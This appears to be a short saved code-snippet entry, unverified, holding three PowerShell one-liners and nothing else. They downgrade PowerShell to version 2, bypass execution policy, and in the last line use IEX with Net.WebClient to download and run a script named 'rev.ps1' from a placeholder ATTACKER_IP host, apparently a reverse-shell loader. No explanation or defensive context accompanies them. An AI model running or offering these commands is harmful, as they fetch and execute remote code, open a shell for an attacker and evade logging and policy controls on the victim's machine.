---
id: ab1ad089-0e95-4729-ba80-5a4a6eed4468
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:26.490939+00:00'
updated_at: '2023-04-10T20:37:04.081265+00:00'
---

# Code Snippet ab1ad089

**Language**: ps1

```ps1
powershell.exe -version 2
powershell.exe -version 2 -ExecutionPolicy bypass
powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
```


